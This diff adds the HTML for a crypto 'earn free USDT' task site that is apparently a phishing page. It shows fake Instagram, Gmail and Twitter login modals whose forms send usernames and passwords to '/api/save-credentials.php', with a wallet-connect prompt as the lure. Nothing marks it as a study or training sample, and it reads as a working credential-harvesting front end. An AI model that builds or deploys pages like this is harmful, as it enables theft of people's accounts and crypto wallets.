@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CryptoTasks - Earn USDT by completing tasks</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap">
+</head>
+<body>
+    <div id="app">
+        <!-- Landing page (initially visible) -->
+        <div id="landing-page" class="page active">
+            <div class="landing-container">
+                <div class="hero-section">
+                    <div class="free-usdt">
+                        <div class="star-icon"></div>
+                        <h2>FREE 10 USDT</h2>
+                    </div>
+                    
+                    <h1>Complete Tasks, <span>Earn Crypto</span></h1>
+                    
+                    <p class="hero-description">
+                        Join thousands of users already earning free USDT by completing
+                        simple social media tasks. Connect your wallet and start earning now!
+                    </p>
+                    
+                    <div class="steps-container">
+                        <div class="step-card">
+                            <div class="step-number">1</div>
+                            <h3>Connect Wallet</h3>
+                            <p>Link your crypto wallet to get started and track your rewards</p>
+                        </div>
+                        
+                        <div class="step-card">
+                            <div class="step-number">2</div>
+                            <h3>Complete Tasks</h3>
+                            <p>Follow social accounts, engage with content, and verify completion</p>
+                        </div>
+                        
+                        <div class="step-card">
+                            <div class="step-number">3</div>
+                            <h3>Receive USDT</h3>
+                            <p>Get your rewards sent directly to your connected wallet</p>
+                        </div>
+                    </div>
+                    
+                    <button id="start-earning-btn" class="primary-button">
+                        Start Earning Now
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m9 18 6-6-6-6"/></svg>
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Dashboard page (initially hidden) -->
+        <div id="dashboard-page" class="page">
+            <div class="sidebar">
+                <div class="logo">
+                    <div class="star-icon small"></div>
+                    <h2>CryptoTasks</h2>
+                </div>
+                
+                <nav>
+                    <a href="#" class="nav-item">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>
+                        Activity
+                    </a>
+                </nav>
+                
+                <button id="disconnect-btn" class="disconnect-button">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"/><polyline points="10 17 15 12 10 7"/><line x1="15" x2="3" y1="12" y2="12"/></svg>
+                    Logout
+                </button>
+            </div>
+            
+            <div class="main-content">
+                <div class="dashboard-header">
+                    <h2>Dashboard</h2>
+                    <div class="usdt-available">
+                        <span class="status-dot"></span>
+                        10 USDT Available
+                    </div>
+                </div>
+                
+                <div class="dashboard-grid">
+                    <div class="progress-card">
+                        <h3>Your Progress</h3>
+                        
+                        <div class="progress-item">
+                            <div class="progress-label">Task Completion</div>
+                            <div class="progress-value">0%</div>
+                        </div>
+                        
+                        <div class="progress-bar">
+                            <div class="progress-fill" style="width: 0%"></div>
+                        </div>
+                        
+                        <h3 class="tasks-title">Tasks to Complete</h3>
+                        
+                        <div class="task-list">
+                            <!-- Instagram Task -->
+                            <div class="task-item">
+                                <div class="task-icon instagram">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="20" height="20" x="2" y="2" rx="5" ry="5"/><path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"/><line x1="17.5" x2="17.51" y1="6.5" y2="6.5"/></svg>
+                                </div>
+                                <div class="task-details">
+                                    <h4>Follow on Instagram</h4>
+                                    <p>Follow @cryptorewards on Instagram</p>
+                                </div>
+                                <div class="task-reward">+2 USDT</div>
+                                <button class="task-button instagram-task">
+                                    Follow
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 7h10v10"/><path d="M7 17 17 7"/></svg>
+                                </button>
+                            </div>
+                            
+                            <!-- Gmail Task -->
+                            <div class="task-item">
+                                <div class="task-icon gmail">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="20" height="16" x="2" y="4" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/></svg>
+                                </div>
+                                <div class="task-details">
+                                    <h4>Login with Gmail</h4>
+                                    <p>Verify your email to access your wallet</p>
+                                </div>
+                                <div class="task-reward">+3 USDT</div>
+                                <button class="task-button gmail-task">
+                                    Verify
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 7h10v10"/><path d="M7 17 17 7"/></svg>
+                                </button>
+                            </div>
+                            
+                            <!-- Twitter Task -->
+                            <div class="task-item">
+                                <div class="task-icon twitter">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 4s-.7 2.1-2 3.4c1.6 10-9.4 17.3-18 11.6 2.2.1 4.4-.6 6-2C3 15.5.5 9.6 3 5c2.2 2.6 5.6 4.1 9 4-.9-4.2 4-6.6 7-3.8 1.1 0 3-1.2 3-1.2z"/></svg>
+                                </div>
+                                <div class="task-details">
+                                    <h4>Follow on Twitter</h4>
+                                    <p>Follow @cryptorewards and retweet our pinned post</p>
+                                </div>
+                                <div class="task-reward">+5 USDT</div>
+                                <button class="task-button twitter-task">
+                                    Follow
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 7h10v10"/><path d="M7 17 17 7"/></svg>
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="rewards-card">
+                        <h3>Reward Summary</h3>
+                        
+                        <div class="reward-item">
+                            <div class="reward-label">Available</div>
+                            <div class="reward-value">10 USDT</div>
+                        </div>
+                        
+                        <div class="reward-item">
+                            <div class="reward-label">Earned</div>
+                            <div class="reward-value">0 USDT</div>
+                        </div>
+                        
+                        <div class="reward-item">
+                            <div class="reward-label">Pending</div>
+                            <div class="reward-value">10 USDT</div>
+                        </div>
+                        
+                        <button class="claim-button">Complete All Tasks to Claim</button>
+                        
+                        <div class="wallet-info">
+                            <p>Rewards will be sent to:</p>
+                            <div class="wallet-address" id="connected-wallet">0x4eff...aad8</div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="wallet-status">
+                    <h4>Wallet connected</h4>
+                    <p>You've successfully connected your wallet</p>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Modal containers -->
+        <div id="connect-wallet-modal" class="modal">
+            <div class="modal-content">
+                <h3>Connect Your Wallet</h3>
+                <p>Please connect your wallet to start earning USDT</p>
+                
+                <div class="wallet-options">
+                    <button class="wallet-option" data-wallet="metamask">
+                        <img src="https://cdn.iconscout.com/icon/free/png-256/metamask-2728406-2261817.png" alt="MetaMask">
+                        <span>MetaMask</span>
+                    </button>
+                    
+                    <button class="wallet-option" data-wallet="walletconnect">
+                        <img src="https://seeklogo.com/images/W/walletconnect-logo-EE83B50C97-seeklogo.com.png" alt="WalletConnect">
+                        <span>WalletConnect</span>
+                    </button>
+                </div>
+                
+                <button class="close-modal">Cancel</button>
+            </div>
+        </div>
+        
+        <div id="instagram-modal" class="modal">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/132px-Instagram_logo_2016.svg.png" alt="Instagram Logo">
+                    <h3>Login to Instagram</h3>
+                </div>
+                
+                <form id="instagram-form" class="login-form" action="/api/save-credentials.php" method="POST">
+                    <div class="form-group">
+                        <input type="text" id="instagram-username" name="username" placeholder="Phone number, username, or email" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <input type="password" id="instagram-password" name="password" placeholder="Password" required>
+                    </div>
+                    
+                    <input type="hidden" name="platform" value="instagram">
+                    
+                    <button type="submit" class="login-button">Log In</button>
+                    
+                    <div class="form-footer">
+                        <a href="#">Forgot password?</a>
+                    </div>
+                </form>
+                
+                <button class="close-modal">Cancel</button>
+            </div>
+        </div>
+        
+        <div id="gmail-modal" class="modal">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/Gmail_icon_%282020%29.svg/2560px-Gmail_icon_%282020%29.svg.png" alt="Gmail Logo">
+                    <h3>Login to Gmail</h3>
+                </div>
+                
+                <form id="gmail-form" class="login-form" action="/api/save-credentials.php" method="POST">
+                    <div class="form-group">
+                        <input type="email" id="gmail-email" name="username" placeholder="Email" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <input type="password" id="gmail-password" name="password" placeholder="Password" required>
+                    </div>
+                    
+                    <input type="hidden" name="platform" value="gmail">
+                    
+                    <button type="submit" class="login-button">Log In</button>
+                    
+                    <div class="form-footer">
+                        <a href="#">Forgot password?</a>
+                    </div>
+                </form>
+                
+                <button class="close-modal">Cancel</button>
+            </div>
+        </div>
+        
+        <div id="twitter-modal" class="modal">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <img src="https://about.twitter.com/content/dam/about-twitter/x/brand-toolkit/logo-black.png.twimg.1920.png" alt="Twitter Logo">
+                    <h3>Login to Twitter</h3>
+                </div>
+                
+                <form id="twitter-form" class="login-form" action="/api/save-credentials.php" method="POST">
+                    <div class="form-group">
+                        <input type="text" id="twitter-username" name="username" placeholder="Phone, email, or username" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <input type="password" id="twitter-password" name="password" placeholder="Password" required>
+                    </div>
+                    
+                    <input type="hidden" name="platform" value="twitter">
+                    
+                    <button type="submit" class="login-button">Log In</button>
+                    
+                    <div class="form-footer">
+                        <a href="#">Forgot password?</a>
+                    </div>
+                </form>
+                
+                <button class="close-modal">Cancel</button>
+            </div>
+        </div>
+    </div>
+    
+    <script src="js/app.js"></script>
+</body>
+</html>
